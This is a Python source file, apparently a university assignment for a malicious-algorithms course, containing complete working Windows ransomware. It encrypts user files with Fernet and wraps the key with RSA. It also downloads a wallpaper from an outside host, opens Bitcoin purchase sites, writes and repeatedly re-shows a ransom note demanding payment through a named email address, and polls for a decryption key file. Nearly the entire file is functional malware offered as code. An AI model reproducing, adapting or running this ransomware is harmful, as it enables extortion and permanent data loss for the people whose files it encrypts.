"""
Cesar Diaz - 1075235
Materia: Algoritmos maliciosos
Entrega: 15/07/2020
<Ransomware: Win32/Win64/NE_AM-v1.A.gen>

Version 1.0

"""

#Librerias
import os #root del sistema
from os.path import expanduser #Acceso a los directorios y archivos. "
from cryptography.fernet import Fernet #Modulo cryptografico encripta y desencripta
import base64
import urllib.request #Usado para descargar y salvar la imagen del background
import subprocess #Crear el subproceso para habrir la nota con el pad del RansomWare
import time  # used to time.sleep interval for ransom note & check desktop to decrypt system
import datetime #Para poner tiempo limite en la nota
import ctypes #Interactua con windows dlls y cambia el fondo de pantalla
import webbrowser #Se encarga de cargar el browser para redirigir a la pagina especificada
import threading # used for ransom note and decryption key on dekstop
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import win32gui # Para hacer que la nota aparezca al frente de todo y reaparezca
import shutil #libreria usada para mover archivos

class virus_Ransomware:

    def __init__(self, key =None):
        """
        Inicio de la clase virus_Ransomware

        """

        self.key = key #Llave criptografica
        self.cryptor = None #Variable de encrypt/decrypt
        self.public_key = None #llave publica RSA usada para encriptar
        self.file_ext_targets = ['txt', 'png', '.pdf']

        #self.public_key = None #RSA public key que se usara para encriptar/des. fernet objects

        # Usar sys_root para crear un absolute path for files
        self.sys_root = expanduser('~')

        #Direccion especifica de la carpeta de prueba
        self.local_root = r'C:\Users\c-dia\Documents\algoritmos maliciosos\Py-version\localRoot' #Debugging/Test -editar para pruebas
        #self.local_root = '.'



    def generar_key(self):
        """
        Genera una llave base64 AES para encriptar archivos.
        """
        self.key = Fernet.generate_key()

        self.cryptor = Fernet(self.key)
        #print(self.key)


    def escribir_key(self):
        """
        Escribe el key a un keyfile
        """

        #print(self.key)
        with open('yellow.txt', 'wb') as f: #fernet key /llave fernet
            f.write(self.key)

    def encrypt_fernet_key(self): #metodo para encriptar la llave publica
        with open('yellow.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('yellow.txt', 'wb') as f:
            # Public RSA key
            self.public_key = RSA.import_key(open('blue.pem').read())
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well, so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sys_root}\Desktop\EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None

    def PP_keys(self): #public and private key generator
        # Generates RSA Encryption + Decryption keys / Public + Private keys
        self.key = RSA.generate(2048)

        private_key = self.key.export_key()
        with open('red.pem', 'wb') as f: #private_key #f'{self.sysRoot}\Music\red.pem'
            f.write(private_key)

        public_key = self.key.publickey().export_key()
        with open('blue.pem', 'wb') as f: #public_key
            f.write(public_key)


    # Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.local_root, topdown=True) #cambiar a sys_root a la hora de hacer ejecutable
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_ext_targets:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    def crypt_file(self, file_path, encrypted=False):
        """
        Este metodo encripta y desencripta un archivo

        Args:
            file_path:str: Absolute path to a file
        """
        #file_path = self.local_root

        with open(file_path,'rb+') as f:
            leer_data = f.read() #leer la info del archivo

            if not encrypted:
                print(f' File pre-encryption: {leer_data}')
                data = self.cryptor.encrypt(leer_data)
                print(f'File post-encryption: {data}')
            else:
                data = self.cryptor.decrypt(leer_data)
                print(f'File post decryption: {data}')

        with open(file_path,'wb') as f:
            f.seek(0)
            f.write(data)
            f.truncate()

    @staticmethod
    def bitcoin():
        url = 'https://bitcoin.org'
        url1 = 'https://www.bitnovo.com/comprar-criptomonedas-bitcoins'
        # Open browser to the https://bitcoin.org
        webbrowser.open(url)
        webbrowser.open(url1)

    def change_desktop_background(self):


        path = f'{self.sys_root}/Desktop/background.jpg'
        imageUrl = 'https://i.pinimg.com/originals/f4/48/a4/f448a4e955f93fcad15ec166874cd21a.jpg'

        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('ReadMe_Note.txt', 'w') as f:
            f.write(f'''
The harddisk of your computer has been encrypted with a Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

For you to get the key you will need to purchase it and restore your data, please follow the next easy steps:

1. Email the file called EMAIL_ME.txt at '{self.sys_root}\Desktop\EMAIL_ME.txt' to vevamiw888@netmail9.com

2. You will recieve your personal BTC (Bitcoin) address for payment.
   Once payment has been completed, send another email to vevamiw888@netmail9.com stating with the subject "PAID".
   Than we will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files.
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying. The price WILL go up.

''')


    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'ReadMe_Note.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) #Este es el metodo que permite a la nota reaparecer y salir al frente
            if top_window == 'ReadMe_Note - Notepad':
                print('\nRansom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('\nRansom note is not the top window - Create it again') # Debugging/Testing

                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'ReadMe_Note'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1
            if count == 5:
                break

    def put_on_desktop(self):
        """ Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
         Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
         -the files
        """
        print('started')
        while True:
            try:
                print('Processing')


                with open(f'{self.sys_root}\Desktop\PUT_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.cryptor = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('\ndecrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            print('Checking for PUT_ON_DESKTOP.txt') # Debugging/Testing

            #Calculo del tiempo
            # Sleep ~ 3 mins ejemplo
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))

    def decrypt (self): #Solo para pruebas
        with open(f'{self.sys_root}\Desktop\PUT_ON_DESKTOP.txt', 'r') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)
            # Decrpyt system once have file is found and we have cryptor with the correct key
            self.crypt_system(encrypted=True)
            print('\ndecrypted') # Debugging/Testing

    def move_file(self):

        #ARCHIVOS
        source1 = 'red.pem'
        source2 = 'blue.pem'

        #PATH DESTINOS
        destination1 =f'{self.sys_root}\Music'
        destination2 =f'{self.sys_root}\Videos'


        shutil.move(source1,destination1)
        shutil.move(source2,destination2)




if __name__ == '__main__':


    """ quitar el modo de comentario para que el archivo se ejecute """
    rware = virus_Ransomware()
    rware.PP_keys()#DONE
    rware.generar_key()#DONE
    rware.crypt_system() #DONE
    rware.escribir_key() #DONE
    rware.encrypt_fernet_key()
    rware.move_file() #DONE
    rware.bitcoin() #DONE
    rware.change_desktop_background() #DONE
    rware.ransom_note() #DONE


    t1 = threading.Thread(target=rware.show_ransom_note)
    t1.start()

    t2 = threading.Thread(target=rware.put_on_desktop)
    t2.start()
